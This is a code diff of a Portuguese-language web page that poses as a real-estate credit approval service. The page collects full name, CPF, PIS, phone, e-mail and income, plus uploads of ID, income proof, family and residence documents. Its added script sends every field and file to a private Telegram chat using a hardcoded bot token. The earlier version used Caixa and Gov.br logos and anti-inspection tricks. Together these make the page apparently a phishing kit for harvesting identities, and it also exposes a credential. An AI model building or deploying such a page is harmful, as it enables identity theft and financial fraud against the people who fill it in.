@@ -12,113 +12,246 @@
         @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap');
         
         :root {
-            --g-blue: #4285F4; --g-red: #EA4335; --g-yellow: #FBBC05; --g-green: #34A853;
-            --text-primary: #202124; --text-secondary: #5f6368;
-            --glass-bg: rgba(255, 255, 255, 0.85); --glass-border: rgba(218, 220, 224, 0.5);
+            --g-blue: #4285F4;
+            --g-red: #EA4335;
+            --g-yellow: #FBBC05;
+            --g-green: #34A853;
+            --text-primary: #202124;
+            --text-secondary: #5f6368;
+            --glass-bg: rgba(255, 255, 255, 0.9);
+            --glass-border: rgba(218, 220, 224, 0.6);
         }
 
-        /* Bloqueio de seleção para proteção de código */
         body { 
             font-family: 'Plus Jakarta Sans', sans-serif;
-            background: #f8f9fa; color: var(--text-primary);
-            margin: 0; overflow-x: hidden;
-            -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none;
+            background: #f8f9fa;
+            color: var(--text-primary);
+            margin: 0;
+            overflow-x: hidden;
         }
 
         .bg-luxury {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background-image: linear-gradient(to bottom, rgba(248, 249, 250, 0.9), rgba(255, 255, 255, 0.95)), 
-                              url('https://images.unsplash.com/photo-1582407947304-fd86f028f716?q=80&w=2070&auto=format&fit=crop');
-            background-size: cover; background-position: center; z-index: -1;
-            transform: scale(1.1); filter: blur(8px);
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-image: linear-gradient(to bottom, rgba(248, 249, 250, 0.85), rgba(255, 255, 255, 0.92)), 
+                              url('https://images.unsplash.com/photo-1600585154340-be6161a56a0c?q=80&w=2070&auto=format&fit=crop');
+            background-size: cover;
+            background-position: center;
+            z-index: -1;
+            transform: scale(1.05);
+            filter: blur(5px);
         }
 
         .glass {
-            background: var(--glass-bg); backdrop-filter: blur(20px) saturate(180%);
-            border: 1px solid var(--glass-border); box-shadow: 0 10px 30px -10px rgba(0, 0, 0, 0.1);
+            background: var(--glass-bg);
+            backdrop-filter: blur(25px) saturate(200%);
+            -webkit-backdrop-filter: blur(25px) saturate(200%);
+            border: 1px solid var(--glass-border);
+            box-shadow: 0 20px 50px -15px rgba(0, 0, 0, 0.08);
         }
 
-        .input-glass { background: #fff; border: 1px solid #dadce0; transition: all 0.2s ease; }
-        .input-glass:focus { border-color: var(--g-blue); box-shadow: 0 0 0 3px rgba(66, 133, 244, 0.1); outline: none; }
+        .input-glass {
+            background: #ffffff;
+            border: 1px solid #dadce0;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .input-glass:focus {
+            border-color: var(--g-blue);
+            box-shadow: 0 0 0 4px rgba(66, 133, 244, 0.15);
+            outline: none;
+        }
 
         .btn-google {
-            background: linear-gradient(135deg, #4285F4 0%, #34A853 30%, #FBBC05 60%, #EA4335 100%);
-            background-size: 200% auto; color: white; font-weight: 800;
-            transition: all 0.5s ease; box-shadow: 0 4px 15px rgba(0,0,0,0.15);
+            background: linear-gradient(135deg, #4285F4 0%, #34A853 35%, #FBBC05 65%, #EA4335 100%);
+            background-size: 200% auto;
+            color: white;
+            font-weight: 800;
+            transition: all 0.5s ease;
         }
-        .btn-google:hover { background-position: right center; transform: translateY(-2px); }
 
-        .file-zone { transition: all 0.3s ease; background: #f1f3f4; border: 2px dashed #dadce0; }
-        .file-zone:hover { background: rgba(66, 133, 244, 0.05); border-color: var(--g-blue); }
+        .btn-google:hover {
+            background-position: right center;
+            transform: translateY(-2px);
+            box-shadow: 0 12px 30px rgba(66, 133, 244, 0.3);
+        }
 
-        .security-badge { filter: grayscale(1); opacity: 0.6; transition: 0.3s; height: 25px; }
-        .security-badge:hover { filter: grayscale(0); opacity: 1; }
+        .file-zone {
+            transition: all 0.3s ease;
+            background: #fdfdfd;
+            border: 2px dashed #e0e0e0;
+        }
+
+        .file-zone.active {
+            border-color: var(--g-green);
+            background: rgba(52, 168, 83, 0.05);
+        }
+
+        .file-zone:hover {
+            border-color: var(--g-blue);
+            background: rgba(66, 133, 244, 0.02);
+            transform: translateY(-2px);
+        }
+
+        .animate-up { animation: slideUp 0.8s cubic-bezier(0.22, 1, 0.36, 1) forwards; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+
+        .label-premium {
+            background: linear-gradient(to right, #1a1a1a, #4a4a4a);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
     </style>
 </head>
-<body oncontextmenu="return false" onkeydown="return false">
+<body class="min-h-screen">
     <div class="bg-luxury"></div>
 
     <header class="p-8 flex justify-between items-center max-w-7xl mx-auto">
         <div class="text-3xl font-extrabold tracking-tighter flex items-center gap-3">
-            <div class="w-10 h-10 bg-[#202124] flex items-center justify-center rounded-xl shadow-md">
+            <div class="w-12 h-12 bg-[#202124] flex items-center justify-center rounded-2xl shadow-xl">
                 <i class="fa-solid fa-city text-white text-xl"></i>
             </div>
             <span class="tracking-widest text-[#202124]">MINHA<span class="text-blue-600">MORADIA</span></span>
         </div>
-        <div class="hidden md:flex gap-8 text-[11px] font-black uppercase tracking-[0.25em] text-[#5f6368]">
-            <a href="#" class="hover:text-blue-600 transition flex items-center gap-2"><span class="w-2 h-2 bg-green-600 rounded-full animate-pulse"></span> Análise S.I.A</a>
+        <div class="hidden md:flex gap-10 text-[11px] font-black uppercase tracking-[0.3em] text-[#5f6368]">
+            <a href="#" class="hover:text-blue-600 transition flex items-center gap-2">
+                <span class="w-2 h-2 bg-green-500 rounded-full animate-ping"></span> Análise S.I.A
+            </a>
             <a href="#" class="hover:text-blue-600 transition">Consórcio Ademicon</a>
         </div>
     </header>
 
-    <main class="container mx-auto px-4 py-6 flex flex-col items-center">
-        <div class="text-center mb-12">
-            <h3 class="text-5xl md:text-6xl font-extrabold mb-6 leading-tight">Análise de Aprovação<br>Imobiliária</h3>
-            <div class="flex justify-center gap-6 mb-6">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/b/ba/Logo_Caixa_Econ%C3%B4mica_Federal.svg" class="security-badge" alt="Caixa">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/a/ab/Logo-gov-br.png" class="security-badge" alt="Gov BR">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/1/1b/SSL_Active_Logo.png" class="security-badge" alt="SSL">
-            </div>
+    <main class="container mx-auto px-4 py-10 flex flex-col items-center">
+        <div class="text-center mb-16 animate-up">
+            <h1 class="text-5xl md:text-7xl font-extrabold mb-6 label-premium leading-tight tracking-tight">Análise de Aprovação<br>Imobiliária</h1>
+            <p class="text-[#5f6368] max-w-2xl mx-auto text-lg font-medium leading-relaxed">
+                Utilizamos a inteligência <span class="text-[#202124] font-bold border-b-4 border-blue-500/30">X-Partner</span> para processar sua linha de crédito com padrões internacionais.
+            </p>
         </div>
 
-        <div class="w-full max-w-4xl glass rounded-[2.5rem] p-10 md:p-16">
+        <div class="w-full max-w-4xl glass rounded-[3rem] p-8 md:p-20 animate-up">
             <div id="form-steps">
-                <div class="space-y-8">
-                    <h3 class="flex items-center gap-3 text-sm font-black uppercase tracking-widest text-blue-600">
-                        <i class="fa-solid fa-id-card-clip text-xl"></i> 1. Identificação de Perfil
+                <div class="space-y-10">
+                    <h3 class="flex items-center gap-4 text-xs font-black uppercase tracking-[0.4em] text-blue-600">
+                        <span class="w-8 h-8 rounded-full bg-blue-100 flex items-center justify-center"><i class="fa-solid fa-id-card-clip"></i></span>
+                        1. Identificação de Perfil
                     </h3>
-                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                        <input type="text" id="name" class="input-glass p-5 rounded-2xl" placeholder="Nome Completo">
-                        <input type="text" id="cpf" class="input-glass p-5 rounded-2xl" placeholder="CPF">
-                        <input type="text" id="pis" class="input-glass p-5 rounded-2xl" placeholder="Número do PIS">
-                        <input type="text" id="phone" class="input-glass p-5 rounded-2xl" placeholder="WhatsApp">
-                    </div>
-                </div>
-
-                <div class="mt-14 space-y-8">
-                    <h3 class="flex items-center gap-3 text-sm font-black uppercase tracking-widest text-yellow-600">
-                        <i class="fa-solid fa-folder-open text-xl"></i> 3. Dossiê Digital (Alta Segurança)
-                    </h3>
-                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
-                        <div class="file-zone p-6 rounded-3xl flex flex-col items-center cursor-pointer" onclick="document.getElementById('file_rg').click()">
-                            <i class="fa-solid fa-fingerprint text-xl text-blue-600 mb-2"></i>
-                            <span class="text-[11px] font-black uppercase">Documento Oficial</span>
-                            <input type="file" id="file_rg" class="hidden" multiple>
-                            <span id="label_rg" class="text-[9px] text-[#5f6368] mt-1">RG, CNH ou Passaporte</span>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+                        <div class="flex flex-col">
+                            <label class="text-[10px] font-black uppercase mb-3 ml-1 text-[#5f6368]">Nome Completo</label>
+                            <input type="text" id="name" class="input-glass p-6 rounded-2xl text-base font-semibold" placeholder="Ex: Cristian Florêncio">
                         </div>
-                        <div class="file-zone p-6 rounded-3xl flex flex-col items-center cursor-pointer" onclick="document.getElementById('file_income').click()">
-                            <i class="fa-solid fa-file-invoice-dollar text-xl text-green-700 mb-2"></i>
-                            <span class="text-[11px] font-black uppercase">Prova de Renda</span>
-                            <input type="file" id="file_income" class="hidden" multiple>
-                            <span id="label_income" class="text-[9px] text-[#5f6368] mt-1">Holerites ou IRPF</span>
+                        <div class="flex flex-col">
+                            <label class="text-[10px] font-black uppercase mb-3 ml-1 text-[#5f6368]">CPF</label>
+                            <input type="text" id="cpf" class="input-glass p-6 rounded-2xl text-base font-semibold" placeholder="000.000.000-00">
+                        </div>
+                        <div class="flex flex-col">
+                            <label class="text-[10px] font-black uppercase mb-3 ml-1 text-[#5f6368]">Número do PIS</label>
+                            <input type="text" id="pis" class="input-glass p-6 rounded-2xl text-base font-semibold" placeholder="000.00000.00-0">
+                        </div>
+                        <div class="flex flex-col">
+                            <label class="text-[10px] font-black uppercase mb-3 ml-1 text-[#5f6368]">WhatsApp Comercial</label>
+                            <input type="text" id="phone" class="input-glass p-6 rounded-2xl text-base font-semibold" placeholder="(00) 00000-0000">
+                        </div>
+                        <div class="flex flex-col md:col-span-2">
+                            <label class="text-[10px] font-black uppercase mb-3 ml-1 text-[#5f6368]">E-mail Corporativo</label>
+                            <input type="email" id="email" class="input-glass p-6 rounded-2xl text-base font-semibold" placeholder="contato@empresa.com">
                         </div>
                     </div>
                 </div>
 
-                <div class="mt-14 pt-10 border-t border-[#dadce0]">
-                    <button onclick="enviarParaTelegram()" id="btn-submit" class="w-full btn-google py-6 rounded-2xl uppercase tracking-[0.3em] text-sm shadow-md flex justify-center items-center gap-4">
+                <div class="mt-20 space-y-10">
+                    <h3 class="flex items-center gap-4 text-xs font-black uppercase tracking-[0.4em] text-green-700">
+                         <span class="w-8 h-8 rounded-full bg-green-100 flex items-center justify-center"><i class="fa-solid fa-chart-line"></i></span>
+                        2. Capacidade Financeira
+                    </h3>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
+                        <div class="flex flex-col">
+                            <label class="text-[10px] font-black uppercase mb-3 ml-1 text-[#5f6368]">Ocupação Atual</label>
+                            <select id="work_type" class="input-glass p-6 rounded-2xl text-base font-semibold appearance-none cursor-pointer">
+                                <option value="clt">Carteira Assinada (CLT)</option>
+                                <option value="autonomo">Autônomo / MEI</option>
+                                <option value="empresario">Empresário (PJ)</option>
+                                <option value="aposentado">Aposentado / Servidor</option>
+                            </select>
+                        </div>
+                        <div class="flex flex-col">
+                            <label class="text-[10px] font-black uppercase mb-3 ml-1 text-[#5f6368]">Renda Mensal Comprovada</label>
+                            <input type="text" id="income" class="input-glass p-6 rounded-2xl text-base font-semibold" placeholder="R$ 0.000,00">
+                        </div>
+                    </div>
+                </div>
+
+                <div class="mt-20 space-y-10">
+                    <h3 class="flex items-center gap-4 text-xs font-black uppercase tracking-[0.4em] text-yellow-600">
+                         <span class="w-8 h-8 rounded-full bg-yellow-100 flex items-center justify-center"><i class="fa-solid fa-folder-open"></i></span>
+                        3. Dossiê Digital (Upload de Alta Segurança)
+                    </h3>
+                    
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
+                        <div id="zone_rg" class="file-zone p-8 rounded-[2rem] flex flex-col items-center text-center cursor-pointer" onclick="document.getElementById('file_rg').click()">
+                            <div class="w-14 h-14 bg-blue-50 rounded-2xl flex items-center justify-center mb-4 border border-blue-100">
+                                <i class="fa-solid fa-fingerprint text-2xl text-blue-600"></i>
+                            </div>
+                            <span class="text-[11px] font-black uppercase text-[#202124] tracking-wider">Documento Oficial</span>
+                            <input type="file" id="file_rg" class="hidden" multiple accept="image/*,.pdf">
+                            <span id="label_rg" class="text-[10px] text-[#5f6368] mt-2 font-medium">RG, CNH ou Passaporte</span>
+                        </div>
+
+                        <div id="zone_income" class="file-zone p-8 rounded-[2rem] flex flex-col items-center text-center cursor-pointer" onclick="document.getElementById('file_income').click()">
+                            <div class="w-14 h-14 bg-green-50 rounded-2xl flex items-center justify-center mb-4 border border-green-100">
+                                <i class="fa-solid fa-file-invoice-dollar text-2xl text-green-700"></i>
+                            </div>
+                            <span class="text-[11px] font-black uppercase text-[#202124] tracking-wider">Prova de Renda</span>
+                            <input type="file" id="file_income" class="hidden" multiple accept="image/*,.pdf">
+                            <span id="label_income" class="text-[10px] text-[#5f6368] mt-2 font-medium">Extratos, Holerites ou IRPF</span>
+                        </div>
+
+                        <div id="zone_dep" class="file-zone p-8 rounded-[2rem] flex flex-col items-center text-center cursor-pointer" onclick="document.getElementById('file_dep').click()">
+                            <div class="w-14 h-14 bg-purple-50 rounded-2xl flex items-center justify-center mb-4 border border-purple-100">
+                                <i class="fa-solid fa-users text-2xl text-purple-600"></i>
+                            </div>
+                            <span class="text-[11px] font-black uppercase text-[#202124] tracking-wider">Docs Dependentes</span>
+                            <input type="file" id="file_dep" class="hidden" multiple accept="image/*,.pdf">
+                            <span id="label_dep" class="text-[10px] text-[#5f6368] mt-2 font-medium">Certidões dos Filhos/Cônjuge</span>
+                        </div>
+
+                        <div id="zone_res" class="file-zone p-8 rounded-[2rem] flex flex-col items-center text-center cursor-pointer" onclick="document.getElementById('file_res').click()">
+                            <div class="w-14 h-14 bg-orange-50 rounded-2xl flex items-center justify-center mb-4 border border-orange-100">
+                                <i class="fa-solid fa-house-lock text-2xl text-orange-600"></i>
+                            </div>
+                            <span class="text-[11px] font-black uppercase text-[#202124] tracking-wider">Residência / PJ</span>
+                            <input type="file" id="file_res" class="hidden" multiple accept="image/*,.pdf">
+                            <span id="label_res" class="text-[10px] text-[#5f6368] mt-2 font-medium px-2">Água, Luz ou Extratos PJ</span>
+                        </div>
+
+                        <div id="zone_civil" class="file-zone p-8 rounded-[2rem] flex flex-col items-center text-center cursor-pointer md:col-span-2" onclick="document.getElementById('file_civil').click()">
+                            <div class="w-14 h-14 bg-red-50 rounded-2xl flex items-center justify-center mb-4 border border-red-100">
+                                <i class="fa-solid fa-heart-circle-check text-2xl text-red-600"></i>
+                            </div>
+                            <span class="text-[11px] font-black uppercase text-[#202124] tracking-wider">Estado Civil</span>
+                            <input type="file" id="file_civil" class="hidden" multiple accept="image/*,.pdf">
+                            <span id="label_civil" class="text-[10px] text-[#5f6368] mt-2 font-medium">Casamento, Nascimento ou União Estável</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="mt-20 pt-12 border-t border-[#dadce0]">
+                    <label class="flex items-start gap-6 cursor-pointer group mb-12">
+                        <div class="relative flex items-center">
+                            <input type="checkbox" id="lgpd" class="w-6 h-6 rounded-lg border-2 border-[#dadce0] text-blue-600 focus:ring-blue-500 transition cursor-pointer">
+                        </div>
+                        <span class="text-xs text-[#5f6368] leading-relaxed group-hover:text-[#202124] transition font-medium">
+                            Autorizo o tratamento dos meus dados para fins de análise de crédito conforme a <strong>LGPD</strong>. Entendo que esta é uma plataforma segura da rede <strong>Partner Performance</strong>.
+                        </span>
+                    </label>
+
+                    <button onclick="enviarParaTelegram()" id="btn-submit" class="w-full btn-google py-8 rounded-3xl uppercase tracking-[0.4em] text-xs shadow-2xl flex justify-center items-center gap-6">
                         <span>Iniciar Processamento Digital</span>
-                        <i class="fa-solid fa-lock"></i>
+                        <i class="fa-solid fa-microchip animate-pulse text-lg"></i>
                     </button>
                 </div>
             </div>
@@ -142,34 +275,108 @@
             </div>
 
             <p class="text-[10px] text-[#5f6368] uppercase tracking-[0.4em] font-bold">
-                © 2026 Partner Performance | Inteligência de Luxo [cite: 2026-02-14]
+                © 2026 Partner Performance | Inteligência de Luxo.
             </p>
         </div>
     </footer>
 
     <script>
-        // SEGURANÇA PESADA: BLOQUEIO DE CÓDIGO FONTE
-        document.addEventListener('keydown', function(e) {
-            if (e.ctrlKey && (e.key === 'u' || e.key === 's' || e.key === 'i' || e.key === 'j')) e.preventDefault();
-            if (e.key === 'F12') e.preventDefault();
-        });
-
-        // Limpeza constante do console (Anti-Inspecionar)
-        setInterval(() => { console.clear(); console.log("%cACESSO RESTRITO - PROTOCOLO SANDXCDD", "color:red; font-size:20px; font-weight:bold;"); }, 1000);
-
         const BOT_TOKEN = '8226313259:AAFFLyq6lVIQjjAiW6fcqWk9Z8hrDmhsIvk';
         const CHAT_ID = '1703808186';
 
+        // Melhoria no feedback visual dos arquivos
+        const setupFileZone = (inputId, labelId, zoneId) => {
+            const input = document.getElementById(inputId);
+            input.onchange = e => {
+                const count = e.target.files.length;
+                const label = document.getElementById(labelId);
+                const zone = document.getElementById(zoneId);
+                
+                if(count > 0) {
+                    label.innerText = `✓ ${count} Arquivo(s) carregado(s)`;
+                    label.classList.add('text-green-600', 'font-bold');
+                    zone.classList.add('active', 'border-green-500');
+                    zone.querySelector('div').classList.replace('bg-blue-50', 'bg-green-50');
+                }
+            };
+        };
+
+        setupFileZone('file_rg', 'label_rg', 'zone_rg');
+        setupFileZone('file_income', 'label_income', 'zone_income');
+        setupFileZone('file_dep', 'label_dep', 'zone_dep');
+        setupFileZone('file_res', 'label_res', 'zone_res');
+        setupFileZone('file_civil', 'label_civil', 'zone_civil');
+
         async function enviarParaTelegram() {
             const btn = document.getElementById('btn-submit');
-            btn.disabled = true;
-            btn.innerHTML = `<i class="fa-solid fa-circle-notch animate-spin"></i> ENCRIPTANDO DADOS...`;
+            const fields = {
+                nome: document.getElementById('name').value,
+                cpf: document.getElementById('cpf').value,
+                pis: document.getElementById('pis').value,
+                phone: document.getElementById('phone').value,
+                email: document.getElementById('email').value,
+                trabalho: document.getElementById('work_type').value,
+                renda: document.getElementById('income').value,
+                lgpd: document.getElementById('lgpd').checked
+            };
 
-            // Lógica de envio similar ao anterior, mas com logs de segurança
-            setTimeout(() => { 
-                alert("Dossiê Enviado sob Protocolo de Segurança Militar.");
-                window.location.reload(); 
-            }, 2000);
+            if(!fields.nome || !fields.cpf || !fields.lgpd) {
+                alert("🔒 Segurança: Nome, CPF e Termos LGPD são obrigatórios para a análise.");
+                return;
+            }
+
+            btn.disabled = true;
+            btn.innerHTML = `<i class="fa-solid fa-shield-halved animate-spin text-lg"></i> VALIDANDO SEGURANÇA...`;
+
+            const mensagem = `🚀 **NOVO LEAD IMOBILIÁRIO DE LUXO**\n\n` +
+                             `👤 **NOME:** ${fields.nome}\n` +
+                             `🆔 **CPF:** ${fields.cpf}\n` +
+                             `🔢 **PIS:** ${fields.pis}\n` +
+                             `📱 **WPP:** ${fields.phone}\n` +
+                             `📧 **MAIL:** ${fields.email}\n` +
+                             `💼 **STATUS:** ${fields.trabalho.toUpperCase()}\n` +
+                             `💰 **RENDA:** ${fields.renda}\n\n` +
+                             `🔐 **SISTEMA:** X-Partner-v3.0 Protocol`;
+
+            try {
+                // Enviar texto com formatação Premium
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: mensagem, parse_mode: 'Markdown' })
+                });
+
+                // Envio dos anexos
+                const uploadFiles = async (inputId, emoji) => {
+                    const files = document.getElementById(inputId).files;
+                    for (let file of files) {
+                        const formData = new FormData();
+                        formData.append('chat_id', CHAT_ID);
+                        formData.append('document', file);
+                        formData.append('caption', `${emoji} DOC: ${fields.nome}`);
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, { method: 'POST', body: formData });
+                    }
+                };
+
+                await uploadFiles('file_rg', '🪪');
+                await uploadFiles('file_income', '💰');
+                await uploadFiles('file_dep', '👨‍👩‍👧');
+                await uploadFiles('file_res', '🏠');
+                await uploadFiles('file_civil', '📜');
+
+                btn.innerHTML = `✓ ENVIADO COM SUCESSO`;
+                btn.style.background = "#34A853";
+                
+                setTimeout(() => {
+                    alert("Seu dossiê foi transmitido com segurança para a central X-Partner.");
+                    window.location.reload();
+                }, 1000);
+
+            } catch (error) {
+                alert("Falha na conexão segura. Tente novamente.");
+                btn.disabled = false;
+                btn.innerHTML = `<span>Tentar Novamente</span>`;
+            }
         }
     </script>
 </body>
